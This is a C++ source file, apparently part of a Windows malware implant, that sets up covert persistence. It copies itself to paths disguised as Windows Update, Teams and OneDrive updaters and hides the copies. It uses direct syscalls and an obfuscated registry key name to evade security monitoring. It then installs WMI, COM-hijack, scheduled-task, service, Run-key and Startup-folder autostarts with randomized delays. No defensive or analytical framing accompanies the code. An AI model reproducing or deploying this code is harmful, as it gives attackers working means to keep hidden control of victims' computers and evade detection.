#include "Persistence.h"
#include "ComHijacker.h"
#include "WmiPersistence.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include "../utils/Obfuscator.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../evasion/Detection.h"
#include <windows.h>
#include <string>
#include <vector>
#include <shlobj.h>
#include <random>
#include <sstream>
#include <algorithm>

namespace persistence {

namespace {

struct PersistTarget {
    std::wstring path;
    std::wstring name;
};

// "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
std::wstring kRunKey = L"\x00\x31\x3c\x20\x23\x35\x24\x31\x0e\x0e\x17\x3d\x37\x27\x3b\x23\x3b\x32\x20\x0e\x0e\x03\x3d\x3a\x30\x3b\x23\x27\x0e\x0e\x17\x21\x26\x26\x31\x3a\x20\x02\x31\x26\x27\x3d\x3b\x3a\x0e\x0e\x06\x21\x3a";

std::wstring getExecutablePath() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

PersistTarget getRandomTarget() {
    std::random_device rd;
    std::mt19937 gen(rd());
    bool isAdmin = utils::IsAdmin();
    std::vector<PersistTarget> targets;

    // Use very legitimate-looking paths/names
    if (isAdmin) {
        wchar_t progData[MAX_PATH];
        SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, progData);
        targets.push_back({std::wstring(progData) + L"\\Microsoft\\Windows\\Update\\winupdate.exe", L"WinUpdate"});
    } else {
        wchar_t localAppData[MAX_PATH];
        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
        targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Teams\\TeamsUpdate.exe", L"TeamsUpdate"});
        targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe", L"OneDriveUpdater"});
    }
    std::uniform_int_distribution<> dis(0, (int)targets.size() - 1);
    return targets[dis(gen)];
}

bool SetFileAttributesStealth(const std::wstring& path) {
    return SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

bool SyscallWriteFile(const std::wstring& ntPath, const std::vector<BYTE>& data) {
    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntCreateFileSsn = resolver.GetServiceNumber("NtCreateFile");
    DWORD ntWriteFileSsn = resolver.GetServiceNumber("NtWriteFile");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
    if (ntCreateFileSsn == 0xFFFFFFFF || ntWriteFileSsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) return false;
    UNICODE_STRING uPath;
    uPath.Buffer = (PWSTR)ntPath.c_str();
    uPath.Length = (USHORT)(ntPath.length() * sizeof(wchar_t));
    uPath.MaximumLength = uPath.Length + sizeof(wchar_t);
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hFile = NULL;
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status = InternalDoSyscall(ntCreateFileSsn, &hFile, (PVOID)(UINT_PTR)(FILE_GENERIC_WRITE | SYNCHRONIZE), &objAttr, &ioStatus, NULL, (PVOID)(UINT_PTR)FILE_ATTRIBUTE_NORMAL, 0, (PVOID)(UINT_PTR)FILE_OVERWRITE_IF, (PVOID)(UINT_PTR)(FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE), NULL, (PVOID)(UINT_PTR)0);
    if (!NT_SUCCESS(status)) return false;
    status = InternalDoSyscall(ntWriteFileSsn, hFile, NULL, NULL, NULL, &ioStatus, (PVOID)data.data(), (PVOID)(UINT_PTR)(ULONG)data.size(), NULL, NULL, NULL, NULL);
    InternalDoSyscall(ntCloseSsn, hFile, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    return NT_SUCCESS(status);
}

std::vector<BYTE> ReadFileBinary(const std::wstring& path) {
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return {};
    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); return {}; }
    std::vector<BYTE> buffer(size);
    DWORD read = 0;
    ReadFile(hFile, buffer.data(), size, &read, NULL);
    CloseHandle(hFile);
    return buffer;
}

bool InstallSchtasks(const std::wstring& implantPath, const std::wstring& taskName) {
    // schtasks without /RL HIGHEST
    std::wstring cmd = L"schtasks /create /tn \"" + taskName + L"\" /tr \"" + implantPath + L"\" /sc logon /f";

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    RtlZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return true;
}

bool VerifySchtasks(const std::wstring& taskName) {
    std::wstring cmd = L"schtasks /query /tn \"" + taskName + L"\"";
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    RtlZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 3000);
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return exitCode == 0;
    }
    return false;
}

bool InstallService(const std::wstring& implantPath, const std::wstring& serviceName) {
    if (!utils::IsAdmin()) return false;
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) return false;
    SC_HANDLE hService = CreateServiceW(hSCM, serviceName.c_str(), L"Windows Update Core Service", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, implantPath.c_str(), NULL, NULL, NULL, NULL, NULL);
    if (hService) {
        StartService(hService, 0, NULL);
        CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCM);
    return hService != NULL;
}

bool VerifyService(const std::wstring& serviceName) {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) return false;
    SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_QUERY_STATUS);
    bool exists = hService != NULL;
    if (hService) CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return exists;
}

bool InstallRegistryRun(const std::wstring& implantPath, const std::wstring& name) {
    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) return false;
    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    std::wstring relativePath = utils::DecryptW(kRunKey);
    std::wstring hkcuPath = L"\\Registry\\User\\" + sid + L"\\" + relativePath;
    UNICODE_STRING uHkcu;
    uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
    uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
    uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hKey = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKey, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    if (NT_SUCCESS(status)) {
        UNICODE_STRING uName;
        uName.Buffer = (PWSTR)name.c_str();
        uName.Length = (USHORT)(name.length() * sizeof(wchar_t));
        uName.MaximumLength = uName.Length + sizeof(wchar_t);
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uName, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)implantPath.c_str(), (PVOID)(UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    }
    if (utils::IsAdmin()) {
        std::wstring hklmPath = L"\\Registry\\Machine\\" + relativePath;
        UNICODE_STRING uHklm;
        uHklm.Buffer = (PWSTR)hklmPath.c_str();
        uHklm.Length = (USHORT)(hklmPath.length() * sizeof(wchar_t));
        uHklm.MaximumLength = uHklm.Length + sizeof(wchar_t);
        InitializeObjectAttributes(&objAttr, &uHklm, OBJ_CASE_INSENSITIVE, NULL, NULL);
        if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hKey, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))) {
            UNICODE_STRING uName;
            uName.Buffer = (PWSTR)name.c_str();
            uName.Length = (USHORT)(name.length() * sizeof(wchar_t));
            uName.MaximumLength = uName.Length + sizeof(wchar_t);
            InternalDoSyscall(ntSetValueKeySsn, hKey, &uName, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)implantPath.c_str(), (PVOID)(UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
            InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        }
    }
    return true;
}

bool VerifyRegistryRun(const std::wstring& name) {
    std::wstring relativePath = utils::DecryptW(kRunKey);
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, relativePath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        bool exists = RegQueryValueExW(hKey, name.c_str(), NULL, NULL, NULL, NULL) == ERROR_SUCCESS;
        RegCloseKey(hKey);
        if (exists) return true;
    }
    if (utils::IsAdmin()) {
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, relativePath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            bool exists = RegQueryValueExW(hKey, name.c_str(), NULL, NULL, NULL, NULL) == ERROR_SUCCESS;
            RegCloseKey(hKey);
            return exists;
        }
    }
    return false;
}

bool InstallStartupFolder(const std::wstring& implantPath, const std::wstring& name) {
    wchar_t userStartup[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, userStartup);
    std::wstring userPath = std::wstring(userStartup) + L"\\" + name + L".exe";
    CopyFileW(implantPath.c_str(), userPath.c_str(), FALSE);
    SetFileAttributesStealth(userPath);
    return true;
}

bool VerifyStartupFolder(const std::wstring& name) {
    wchar_t userStartup[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, userStartup);
    std::wstring userPath = std::wstring(userStartup) + L"\\" + name + L".exe";
    return GetFileAttributesW(userPath.c_str()) != INVALID_FILE_ATTRIBUTES;
}

void CreateDirectoryRecursive(const std::wstring& path) {
    size_t lastSlash = path.find_last_of(L"\\");
    if (lastSlash != std::wstring::npos) {
        std::wstring dirOnly = path.substr(0, lastSlash);
        std::wstring current;
        std::wstringstream ss(dirOnly);
        std::wstring segment;
        while (std::getline(ss, segment, L'\\')) {
            if (current.empty()) current = segment;
            else current += L"\\" + segment;
            CreateDirectoryW(current.c_str(), NULL);
        }
    }
}

} // namespace

bool establishPersistence(const std::wstring& overrideSourcePath) {
    std::wstring sourcePath = overrideSourcePath.empty() ? getExecutablePath() : overrideSourcePath;
    PersistTarget target = getRandomTarget();

    if (lstrcmpiW(sourcePath.c_str(), target.path.c_str()) == 0) return false;

    // Stealth first: Create directory and copy binary
    CreateDirectoryRecursive(target.path);
    std::vector<BYTE> selfData = ReadFileBinary(sourcePath);
    bool copied = false;
    if (!selfData.empty()) {
        std::wstring ntPersistPath = L"\\??\\" + target.path;
        copied = SyscallWriteFile(ntPersistPath, selfData);
    }
    if (!copied) copied = CopyFileW(sourcePath.c_str(), target.path.c_str(), FALSE) != 0;

    if (copied) {
        SetFileAttributesStealth(target.path);
    }

    // Install ALL persistence methods with jitter
    std::vector<int> methods = {1, 2, 3, 5, 6}; // Skip Service by default
    if (utils::IsAdmin()) methods.push_back(4); // Only if already admin

    std::random_device rd;
    std::mt19937 g(rd());
    std::shuffle(methods.begin(), methods.end(), g);

    for (int m : methods) {
        Sleep(15000 + (GetTickCount() % 30000)); // Significant delay between actions

        switch (m) {
            case 1: // WMI (User)
                if (WmiPersistence::Install(target.path, target.name)) {
                    WmiPersistence::Verify(target.name);
                }
                break;
            case 2: // COM (User)
                {
                    std::wstring clsid = L"{00021400-0000-0000-C000-000000000046}";
                    if (ComHijacker::Install(target.path, clsid)) {
                        ComHijacker::Verify(clsid);
                    }
                }
                break;
            case 3: // Schtasks (User/Limited)
                if (InstallSchtasks(target.path, target.name)) {
                    VerifySchtasks(target.name);
                }
                break;
            case 4: // Service (Admin only)
                if (InstallService(target.path, target.name)) {
                    VerifyService(target.name);
                }
                break;
            case 5: // Run Key (User/Admin)
                if (InstallRegistryRun(target.path, target.name)) {
                    VerifyRegistryRun(target.name);
                }
                break;
            case 6: // Startup Folder (User)
                if (InstallStartupFolder(target.path, target.name)) {
                    VerifyStartupFolder(target.name);
                }
                break;
        }
    }

    return true;
}

void ReinstallPersistence() {
    establishPersistence();
}

} // namespace persistence
